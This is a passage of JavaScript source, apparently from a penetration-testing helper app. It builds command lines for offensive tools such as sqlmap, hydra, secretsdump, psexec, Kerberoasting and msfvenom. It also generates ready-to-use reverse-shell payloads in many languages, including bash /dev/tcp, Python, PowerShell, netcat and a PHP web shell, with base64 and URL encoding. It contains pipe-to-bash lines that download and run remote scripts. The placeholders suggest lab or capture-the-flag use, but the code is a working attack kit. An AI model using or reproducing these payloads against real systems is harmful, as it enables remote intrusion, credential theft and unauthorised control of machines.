    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/dirb/common.txt',placeholder:'/usr/share/seclists/...'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt,html'},{id:'threads',label:'Threads',type:'text',default:'50',placeholder:'50'},{id:'extra',label:'Extra Flags',type:'text',default:'',placeholder:'--no-error'}],
    buildCommand(p){return `gobuster dir -u ${p.url} -w ${p.wordlist} ${p.ext?`-x ${p.ext}`:''} -t ${p.threads||50} ${p.extra||''}`.trim().replace(/\s+/g,' ');}},
  { id:'gobuster-vhost',label:'gobuster (vhost)',category:'web',description:'Virtual host / subdomain discovery',install:'sudo apt install gobuster',referenceUrl:'https://github.com/OJ/gobuster',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',placeholder:'subdomains wordlist'}],
    buildCommand(p){return `gobuster vhost -u ${p.url} -w ${p.wordlist} --append-domain`;}},
  { id:'ffuf',label:'ffuf',category:'web',description:'Fast web fuzzer',install:'sudo apt install ffuf',referenceUrl:'https://github.com/ffuf/ffuf',
    params:[{id:'url',label:'URL with FUZZ',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/FUZZ'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',placeholder:'wordlist path'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt'},{id:'fc',label:'Filter Codes',type:'text',default:'404',placeholder:'404,403'},{id:'mc',label:'Match Codes',type:'text',default:'',placeholder:'200,301'}],
    buildCommand(p){return `ffuf -u ${p.url} -w ${p.wordlist} ${p.ext?`-e .${p.ext.split(',').join(',.')}`:''}  ${p.fc?`-fc ${p.fc}`:''} ${p.mc?`-mc ${p.mc}`:''} -v`.trim().replace(/\s+/g,' ');}},
  { id:'feroxbuster',label:'feroxbuster',category:'web',description:'Recursive content discovery',install:'sudo apt install feroxbuster',referenceUrl:'https://github.com/epi052/feroxbuster',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',placeholder:'wordlist'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt'}],
    buildCommand(p){return `feroxbuster -u ${p.url} -w ${p.wordlist} ${p.ext?`-x ${p.ext}`:''} --auto-tune`.trim();}},
  { id:'nikto',label:'nikto',category:'web',description:'Web server vulnerability scanner',install:'sudo apt install nikto',referenceUrl:'https://github.com/sullo/nikto',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'80',placeholder:'80'},{id:'ssl',label:'SSL',type:'select',default:'no',options:['no','yes']}],
    buildCommand(p){return `nikto -h ${p.target} -p ${p.port||80} ${p.ssl==='yes'?'-ssl':''}`.trim();}},
  { id:'wpscan',label:'wpscan',category:'web',description:'WordPress vulnerability scanner',install:'sudo apt install wpscan',referenceUrl:'https://github.com/wpscanteam/wpscan',
    params:[{id:'url',label:'WordPress URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'mode',label:'Enumerate',type:'text',default:'u,p,t',placeholder:'u,p,t'},{id:'apikey',label:'WPScan API Key',type:'text',default:'',placeholder:'optional'}],
    buildCommand(p){return `wpscan --url ${p.url} --enumerate ${p.mode||'u,p,t'} ${p.apikey?`--api-token ${p.apikey}`:''}`.trim();}},
  { id:'sqlmap',label:'sqlmap',category:'web',description:'Automated SQL injection',install:'sudo apt install sqlmap',referenceUrl:'https://sqlmap.org',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/page?id=1'},{id:'data',label:'POST Data',type:'text',default:'',placeholder:'user=admin&pass=test'},{id:'level',label:'Level',type:'select',default:'2',options:['1','2','3','4','5']},{id:'risk',label:'Risk',type:'select',default:'1',options:['1','2','3']},{id:'dbs',label:'Dump DBs',type:'select',default:'yes',options:['yes','no']}],
    buildCommand(p){return `sqlmap -u "${p.url}" ${p.data?`--data="${p.data}"`:''}  --level=${p.level||2} --risk=${p.risk||1} ${p.dbs==='yes'?'--dbs':''} --batch`.trim().replace(/\s+/g,' ');}},
  // SMB/AD
  { id:'smbclient',label:'smbclient',category:'smb-ad',description:'SMB share enumeration and access',install:'sudo apt install smbclient',referenceUrl:'https://www.samba.org/samba/docs/current/man-html/smbclient.1.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'share',label:'Share Name',type:'text',default:'',placeholder:'SYSVOL (blank=list)'},{id:'user',label:'Username',type:'text',default:'',placeholder:'anonymous'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'(blank for anon)'}],
    buildCommand(p){const creds=p.user?`-U "${p.user}%${p.pass||''}"`:'-N';return p.share?`smbclient //${p.target}/${p.share} ${creds}`:`smbclient -L //${p.target} ${creds}`;}},
  { id:'enum4linux',label:'enum4linux',category:'smb-ad',description:'SMB/LDAP enumeration',install:'sudo apt install enum4linux',referenceUrl:'https://github.com/CiscoCXSecurity/enum4linux',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'mode',label:'Mode',type:'select',default:'-a',options:['-a','-u','-g','-s','-p','-r']}],
    buildCommand(p){return `enum4linux ${p.mode||'-a'} ${p.target}`;}},
  { id:'crackmapexec',label:'crackmapexec',category:'smb-ad',description:'SMB/AD Swiss army knife',install:'sudo apt install crackmapexec',referenceUrl:'https://github.com/Porchetta-Industries/CrackMapExec',
    params:[{id:'target',label:'Target IP/Range',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'proto',label:'Protocol',type:'select',default:'smb',options:['smb','winrm','rdp','ldap','mssql']},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password/Hash',type:'text',default:'',placeholder:'password'},{id:'action',label:'Action',type:'select',default:'--shares',options:['--shares','--users','--groups','--pass-pol','--sam','--lsa','--ntds']}],
    buildCommand(p){const creds=p.user?`-u "${p.user}" -p "${p.pass||''}"`:''  ;return `crackmapexec ${p.proto||'smb'} ${p.target} ${creds} ${p.action||''}`.trim().replace(/\s+/g,' ');}},
  { id:'impacket-secretsdump',label:'secretsdump',category:'smb-ad',description:'Dump SAM/NTDS hashes',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'P@ssword1'},{id:'target',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-secretsdump ${p.domain||'WORKGROUP'}/${p.user}:${p.pass}@${p.target}`;}},
  { id:'impacket-psexec',label:'psexec (impacket)',category:'smb-ad',description:'Remote code execution via SMB',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'.',placeholder:'CORP.LOCAL or .'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'P@ssword1'},{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-psexec ${p.domain||'.'}/${p.user}:${p.pass}@${p.target}`;}},
  { id:'bloodhound',label:'bloodhound-python',category:'smb-ad',description:'AD attack path data collection',install:'pip3 install bloodhound',referenceUrl:'https://github.com/fox-it/BloodHound.py',
    params:[{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `bloodhound-python -u ${p.user} -p '${p.pass}' -d ${p.domain} -dc ${p.dc} -c all --zip`;}},
  { id:'kerberoast',label:'GetUserSPNs (Kerberoast)',category:'smb-ad',description:'Kerberoasting — request TGS tickets',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `impacket-GetUserSPNs ${p.domain}/${p.user}:${p.pass} -dc-ip ${p.dc} -request -outputfile kerberoast.hash`;}},
  { id:'asrep',label:'GetNPUsers (AS-REP)',category:'smb-ad',description:'AS-REP Roasting',install:'sudo apt install python3-impacket',referenceUrl:'https://github.com/fortra/impacket',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'CORP.LOCAL'},{id:'dc',label:'DC IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'usersfile',label:'Users File',type:'text',default:'users.txt',placeholder:'users.txt'}],
    buildCommand(p){return `impacket-GetNPUsers ${p.domain}/ -usersfile ${p.usersfile} -dc-ip ${p.dc} -no-pass -format hashcat`;}},
  { id:'evil-winrm',label:'evil-winrm',category:'smb-ad',description:'WinRM shell (PowerShell remoting)',install:'gem install evil-winrm',referenceUrl:'https://github.com/Hackplayers/evil-winrm',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'user',label:'Username',type:'text',default:'',placeholder:'administrator'},{id:'pass',label:'Password',type:'text',default:'',placeholder:'password'},{id:'hash',label:'NT Hash (optional)',type:'text',default:'',placeholder:'optional NTLM hash'}],
    buildCommand(p){return p.hash?`evil-winrm -i ${p.target} -u ${p.user} -H ${p.hash}`:`evil-winrm -i ${p.target} -u ${p.user} -p '${p.pass}'`;}},
  // AUTH
  { id:'hydra',label:'hydra',category:'auth',description:'Network brute force tool',install:'sudo apt install hydra',referenceUrl:'https://github.com/vanhauser-thc/thc-hydra',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'service',label:'Service',type:'select',default:'ssh',options:['ssh','ftp','smb','rdp','http-post-form','mysql','mssql','vnc','telnet','pop3','smtp']},{id:'user',label:'Username/File',type:'text',default:'admin',placeholder:'admin or users.txt'},{id:'wordlist',label:'Password Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'threads',label:'Threads',type:'text',default:'16',placeholder:'16'},{id:'extra',label:'Extra (http-post-form)',type:'text',default:'',placeholder:'/login:user=^USER^&pass=^PASS^:Invalid'}],
    buildCommand(p){const uf=p.user&&p.user.endsWith('.txt')?`-L ${p.user}`:`-l ${p.user}`;return `hydra -t ${p.threads||16} ${uf} -P ${p.wordlist} ${p.service} ${p.target}${p.extra&&p.service==='http-post-form'?' "'+p.extra+'"':''}`.trim();}},
  { id:'john',label:'john',category:'auth',description:'John the Ripper hash cracker',install:'sudo apt install john',referenceUrl:'https://www.openwall.com/john/',
    params:[{id:'hashfile',label:'Hash File',type:'text',default:'hash.txt',placeholder:'hashes.txt'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'format',label:'Format',type:'text',default:'',placeholder:'NT, md5crypt (optional)'},{id:'rules',label:'Rules',type:'text',default:'',placeholder:'best64 (optional)'}],
    buildCommand(p){return `john ${p.hashfile} --wordlist=${p.wordlist} ${p.format?`--format=${p.format}`:''} ${p.rules?`--rules=${p.rules}`:''}`.trim().replace(/\s+/g,' ');}},
  { id:'hashcat',label:'hashcat',category:'auth',description:'GPU-accelerated hash cracker',install:'sudo apt install hashcat',referenceUrl:'https://hashcat.net/wiki/',
    params:[{id:'hashfile',label:'Hash File',type:'text',default:'hash.txt',placeholder:'hash.txt'},{id:'mode',label:'Mode (-m)',type:'text',default:'0',placeholder:'0=MD5, 1000=NTLM, 1800=sha512crypt'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/rockyou.txt',placeholder:'rockyou.txt'},{id:'rules',label:'Rules File',type:'text',default:'',placeholder:'best64.rule (optional)'},{id:'attack',label:'Attack Mode',type:'select',default:'0',options:['0 (dictionary)','3 (brute force)','6 (hybrid)']}],
    buildCommand(p){return `hashcat -a ${p.attack?p.attack.split(' ')[0]:'0'} -m ${p.mode||0} ${p.hashfile} ${p.wordlist} ${p.rules?`-r ${p.rules}`:''} --force`.trim().replace(/\s+/g,' ');}},
  // EXPLOIT
  { id:'searchsploit',label:'searchsploit',category:'exploit',description:'Exploit-DB offline search',install:'sudo apt install exploitdb',referenceUrl:'https://www.exploit-db.com',
    params:[{id:'query',label:'Search Query',type:'text',default:'',placeholder:'Apache 2.4.49'},{id:'flags',label:'Flags',type:'text',default:'',placeholder:'--www -t'}],
    buildCommand(p){return `searchsploit ${p.flags||''} "${p.query}"`.trim();}},
  { id:'msfvenom',label:'msfvenom',category:'exploit',description:'Payload generator',install:'sudo apt install metasploit-framework',referenceUrl:'https://docs.metasploit.com',
    params:[{id:'payload',label:'Payload',type:'select',default:'linux/x64/shell_reverse_tcp',options:['linux/x64/shell_reverse_tcp','linux/x64/meterpreter/reverse_tcp','windows/x64/shell_reverse_tcp','windows/x64/meterpreter/reverse_tcp','php/reverse_php','java/jsp_shell_reverse_tcp']},{id:'lhost',label:'LHOST',type:'text',default:'',placeholder:'10.10.14.x'},{id:'lport',label:'LPORT',type:'text',default:'4444',placeholder:'4444'},{id:'format',label:'Format',type:'select',default:'elf',options:['elf','exe','raw','war','jar','php','asp','aspx','ps1','py']},{id:'output',label:'Output File',type:'text',default:'shell',placeholder:'shell'}],
    buildCommand(p){const exts={elf:'',exe:'.exe',php:'.php',asp:'.asp',aspx:'.aspx',ps1:'.ps1',py:'.py',war:'.war',jar:'.jar'};return `msfvenom -p ${p.payload} LHOST=${p.lhost} LPORT=${p.lport||4444} -f ${p.format} -o ${p.output||'shell'}${exts[p.format]||''}`;}},
  // POST-EXPLOIT
  { id:'linpeas',label:'linpeas',category:'post',description:'Linux privilege escalation enumeration',install:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',referenceUrl:'https://github.com/peass-ng/PEASS-ng',
    params:[{id:'lhost',label:'Your IP',type:'text',default:'',placeholder:'10.10.14.x'},{id:'method',label:'Method',type:'select',default:'curl',options:['curl','wget','python3 server']}],
    buildCommand(p){if(p.method==='wget')return `wget http://${p.lhost}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh`;if(p.method==='python3 server')return `# Your machine:\npython3 -m http.server 80\n# Target:\ncurl http://${p.lhost}/linpeas.sh | bash`;return `curl http://${p.lhost}/linpeas.sh | bash`;}},
  { id:'winpeas',label:'winpeas',category:'post',description:'Windows privilege escalation enumeration',install:'Download from: https://github.com/peass-ng/PEASS-ng/releases',referenceUrl:'https://github.com/peass-ng/PEASS-ng',
    params:[{id:'lhost',label:'Your IP',type:'text',default:'',placeholder:'10.10.14.x'}],
    buildCommand(p){return `.\\winPEAS.exe\n\n# Transfer via impacket SMB server:\n# Your machine: impacket-smbserver share . -smb2support\n# Target: \\\\${p.lhost||'YOUR_IP'}\\share\\winPEAS.exe`;}},
  { id:'pwncat',label:'pwncat',category:'post',description:'Fancy reverse shell handler with post-exploit modules',install:'pip3 install pwncat-cs',referenceUrl:'https://pwncat.readthedocs.io',
    params:[{id:'port',label:'Listen Port',type:'text',default:'4444',placeholder:'4444'}],
    buildCommand(p){return `pwncat-cs -lp ${p.port||4444}`;}},
  // NET
  { id:'netcat',label:'netcat',category:'net',description:'Swiss army knife of networking',install:'sudo apt install netcat-openbsd',referenceUrl:'https://man.openbsd.org/nc.1',
    params:[{id:'mode',label:'Mode',type:'select',default:'listen',options:['listen','connect','port-scan','file-transfer-receive']},{id:'host',label:'Host/IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'4444',placeholder:'4444'},{id:'file',label:'File (transfer)',type:'text',default:'',placeholder:'file.txt'}],
    buildCommand(p){switch(p.mode){case'listen':return `nc -lvnp ${p.port||4444}`;case'connect':return `nc ${p.host} ${p.port||4444}`;case'port-scan':return `nc -zv ${p.host} 1-65535 2>&1 | grep -i open`;case'file-transfer-receive':return `nc -lvnp ${p.port||4444} > ${p.file||'received_file'}`;default:return `nc -lvnp ${p.port||4444}`;}}},
  { id:'curl',label:'curl',category:'net',description:'HTTP requests and file transfer',install:'sudo apt install curl',referenceUrl:'https://curl.se/docs/',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/path'},{id:'method',label:'Method',type:'select',default:'GET',options:['GET','POST','PUT','DELETE','PATCH','HEAD']},{id:'data',label:'POST Data',type:'text',default:'',placeholder:'key=value'},{id:'headers',label:'Headers',type:'text',default:'',placeholder:'Content-Type: application/json'},{id:'output',label:'Output File',type:'text',default:'',placeholder:'output.html'}],
    buildCommand(p){return `curl -s ${p.method!=='GET'?`-X ${p.method}`:''} ${p.headers?`-H '${p.headers}'`:''} ${p.data?`-d '${p.data}'`:''} ${p.output?`-o ${p.output}`:''} '${p.url}'`.trim().replace(/\s+/g,' ');}},
  { id:'wget',label:'wget',category:'net',description:'File download from web',install:'sudo apt install wget',referenceUrl:'https://www.gnu.org/software/wget/manual/wget.html',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/file'},{id:'output',label:'Output File',type:'text',default:'',placeholder:'file.txt'}],
    buildCommand(p){return `wget ${p.output?`-O ${p.output}`:''} '${p.url}'`.trim();}},
  { id:'ssh',label:'ssh',category:'net',description:'SSH connection and tunnelling',install:'sudo apt install openssh-client',referenceUrl:'https://man.openbsd.org/ssh',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'user',label:'Username',type:'text',default:'',placeholder:'user'},{id:'port',label:'Port',type:'text',default:'22',placeholder:'22'},{id:'key',label:'Key File',type:'text',default:'',placeholder:'id_rsa'},{id:'mode',label:'Mode',type:'select',default:'connect',options:['connect','local-forward','remote-forward','dynamic-socks']},{id:'fwd',label:'Forward Ports',type:'text',default:'',placeholder:'8080:127.0.0.1:80'}],
    buildCommand(p){const base=`ssh ${p.key?`-i ${p.key}`:''} -p ${p.port||22} ${p.user}@${p.target}`.trim().replace(/\s+/g,' ');switch(p.mode){case'local-forward':return `${base} -L ${p.fwd||'8080:127.0.0.1:80'} -N`;case'remote-forward':return `${base} -R ${p.fwd||'8080:127.0.0.1:80'} -N`;case'dynamic-socks':return `${base} -D ${p.fwd||'1080'} -N -q`;default:return base;}}},
  { id:'ftp',label:'ftp',category:'net',description:'FTP client (anon login & download)',install:'sudo apt install ftp',referenceUrl:'https://linux.die.net/man/1/ftp',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'}],
    buildCommand(p){return `ftp ${p.target}\n# At prompt: anonymous / anonymous\n# Commands: ls, get <file>, mget *, bye`;}},
  // OSINT
  { id:'theharvester',label:'theHarvester',category:'osint',description:'Email/hostname/IP harvesting',install:'sudo apt install theharvester',referenceUrl:'https://github.com/laramies/theHarvester',
    params:[{id:'domain',label:'Domain',type:'text',default:'',placeholder:'example.com'},{id:'sources',label:'Sources',type:'text',default:'all',placeholder:'google,bing,shodan'},{id:'limit',label:'Result Limit',type:'text',default:'500',placeholder:'500'}],
    buildCommand(p){return `theHarvester -d ${p.domain} -b ${p.sources||'all'} -l ${p.limit||500}`;}},
  { id:'sherlock',label:'sherlock',category:'osint',description:'Username search across social platforms',install:'pip3 install sherlock-project',referenceUrl:'https://github.com/sherlock-project/sherlock',
    params:[{id:'username',label:'Username',type:'text',default:'',placeholder:'target_username'}],
    buildCommand(p){return `sherlock ${p.username} --print-found`;}},
  { id:'whois',label:'whois',category:'osint',description:'Domain registration lookup',install:'sudo apt install whois',referenceUrl:'https://www.whois.net',
    params:[{id:'target',label:'Domain or IP',type:'text',autoFill:'ip',placeholder:'example.com'}],
    buildCommand(p){return `whois ${p.target}`;}},
  { id:'dig',label:'dig',category:'osint',description:'DNS lookup tool',install:'sudo apt install dnsutils',referenceUrl:'https://linux.die.net/man/1/dig',
    params:[{id:'target',label:'Domain/IP',type:'text',autoFill:'ip',placeholder:'example.com'},{id:'type',label:'Record Type',type:'select',default:'ANY',options:['ANY','A','AAAA','MX','NS','TXT','CNAME','SOA','PTR','AXFR']},{id:'server',label:'DNS Server',type:'text',default:'',placeholder:'8.8.8.8 (optional)'}],
    buildCommand(p){return `dig ${p.server?`@${p.server}`:''} ${p.target} ${p.type||'ANY'}`.trim();}},
  { id:'exiftool',label:'exiftool',category:'osint',description:'Extract metadata from files',install:'sudo apt install libimage-exiftool-perl',referenceUrl:'https://exiftool.org',
    params:[{id:'file',label:'File',type:'text',default:'',placeholder:'image.jpg or *.pdf'}],
    buildCommand(p){return `exiftool ${p.file}`;}},
  { id:'shodan-cli',label:'shodan CLI',category:'osint',description:'Shodan search from command line',install:'pip3 install shodan && shodan init <API_KEY>',referenceUrl:'https://cli.shodan.io',
    params:[{id:'query',label:'Search Query',type:'text',default:'',placeholder:'apache country:US'},{id:'target',label:'Target IP (host info)',type:'text',autoFill:'ip',placeholder:'leave blank for search'}],
    buildCommand(p){return (p.target&&!p.query)?`shodan host ${p.target}`:`shodan search "${p.query}"`;}},
  // MISC
  { id:'openssl',label:'openssl',category:'misc',description:'SSL/TLS testing, cert inspection',install:'sudo apt install openssl',referenceUrl:'https://www.openssl.org/docs/',
    params:[{id:'mode',label:'Mode',type:'select',default:'s_client',options:['s_client','genrsa','req -x509','dgst -sha256','base64']},{id:'target',label:'Target',type:'text',autoFill:'url',placeholder:'example.com:443 or filename'}],
    buildCommand(p){switch(p.mode){case's_client':return `echo "" | openssl s_client -connect ${p.target} -showcerts 2>/dev/null | openssl x509 -noout -text`;case'genrsa':return `openssl genrsa -out private.pem 2048`;case'req -x509':return `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`;case'dgst -sha256':return `openssl dgst -sha256 ${p.target}`;case'base64':return `openssl base64 -in ${p.target} -out ${p.target}.b64`;default:return `openssl ${p.mode} ${p.target}`;}}},
  { id:'python-server',label:'Python HTTP Server',category:'misc',description:'Serve files for target download',install:'Built-in (python3)',referenceUrl:'https://docs.python.org/3/library/http.server.html',
    params:[{id:'port',label:'Port',type:'text',default:'80',placeholder:'80'}],
    buildCommand(p){return `python3 -m http.server ${p.port||80}`;}},
  { id:'base64-cli',label:'base64 (CLI)',category:'misc',description:'Encode/decode base64 in shell',install:'Built-in',referenceUrl:'https://linux.die.net/man/1/base64',
    params:[{id:'mode',label:'Mode',type:'select',default:'encode',options:['encode','decode']},{id:'input',label:'Input String/File',type:'text',default:'',placeholder:'"string" or filename'}],
    buildCommand(p){return p.mode==='decode'?`echo "${p.input}" | base64 -d`:`echo -n "${p.input}" | base64`;}},
];

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1F — REVERSE SHELL  (from reverseshell.js)
// ═══════════════════════════════════════════════════════════════════════════════

const SHELL_LANGUAGES = [
  {id:'bash',label:'Bash'},{id:'python2',label:'Python 2'},{id:'python3',label:'Python 3'},
  {id:'php',label:'PHP'},{id:'powershell',label:'PowerShell'},{id:'perl',label:'Perl'},
  {id:'ruby',label:'Ruby'},{id:'java',label:'Java'},{id:'golang',label:'Golang'},
  {id:'nodejs',label:'Node.js'},{id:'socat',label:'Socat'},{id:'awk',label:'Awk'},
  {id:'lua',label:'Lua'},{id:'nc',label:'Netcat'},{id:'ncat',label:'Ncat'},
  {id:'busybox',label:'BusyBox nc'},{id:'telnet',label:'Telnet'},
];

function generateShell(lang, ip, port) {
  const p = port || 4444;
  const i = ip || 'LHOST';
  const shells = {
    bash:       { payload:`bash -i >& /dev/tcp/${i}/${p} 0>&1`, payloadAlt:`bash -c 'bash -i >& /dev/tcp/${i}/${p} 0>&1'`, note:'Standard bash TCP redirect. If first fails, try second.' },
    python2:    { payload:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, note:'Python 2 using subprocess.' },
    python3:    { payload:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, payloadAlt:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'`, note:'Second form spawns a PTY — more stable shell.' },
    php:        { payload:`php -r '$sock=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`, payloadAlt:`<?php system("bash -c 'bash -i >& /dev/tcp/${i}/${p} 0>&1'"); ?>`, note:'First is one-liner. Second is a web shell (.php file).' },
    powershell: { payload:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, note:'Full PowerShell reverse shell with interactive prompt.' },
    perl:       { payload:`perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, note:'Perl reverse shell using Socket module.' },
    ruby:       { payload:`ruby -rsocket -e'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, payloadAlt:`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, note:'Second form forks for stability.' },
    java:       { payload:`r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`, note:'Java Groovy-style runtime execution.' },
    golang:     { payload:`package main\nimport("net";"os/exec";"time")\nfunc main(){\n  c,_:=net.Dial("tcp","${i}:${p}")\n  for{\n    cmd:=exec.Command("/bin/sh")\n    cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c\n    cmd.Run()\n    time.Sleep(time.Second)\n  }\n}`, note:'Compile and run on target.' },
    nodejs:     { payload:`(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p},"${i}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`, note:'Node.js reverse shell using net module.' },
    socat:      { payload:`socat TCP:${i}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`, payloadAlt:`socat TCP4-LISTEN:${p},reuseaddr,fork EXEC:/bin/bash`, note:'Socat gives a proper PTY. First=connect, second=listen.' },
    awk:        { payload:`awk 'BEGIN {s = "/inet/tcp/0/${i}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`, note:'Awk reverse shell — useful when other methods blocked.' },
    lua:        { payload:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${i}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`, note:'Lua reverse shell using socket library.' },
    nc:         { payload:`nc -e /bin/sh ${i} ${p}`, payloadAlt:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`, note:'First works with nc -e. Second is mkfifo method for restricted nc.' },
    ncat:       { payload:`ncat ${i} ${p} -e /bin/bash`, payloadAlt:`ncat ${i} ${p} --ssl -e /bin/bash`, note:'Ncat supports --ssl for encrypted shell.' },
    busybox:    { payload:`busybox nc ${i} ${p} -e /bin/sh`, note:'BusyBox nc for minimal systems (containers, IoT).' },
    telnet:     { payload:`TF=$(mktemp -u);mkfifo $TF && telnet ${i} ${p} 0<$TF | /bin/sh 1>$TF`, note:'Telnet-based shell using named pipe.' },
  };
  const s = shells[lang] || shells.bash;
  return {
    payload: s.payload,
    payloadAlt: s.payloadAlt || null,
    listener: `nc -lvnp ${p}`,
    stabilise: `# Shell stabilisation (Linux)\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n# Then: Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm; stty rows 40 cols 160`,
    note: s.note || '',
    lang,
  };
}

function encodeShell(payload, encoding) {
  switch(encoding) {
    case 'base64': return btoa(unescape(encodeURIComponent(payload)));
    case 'url':    return encodeURIComponent(payload);
    default:       return payload;
  }
}

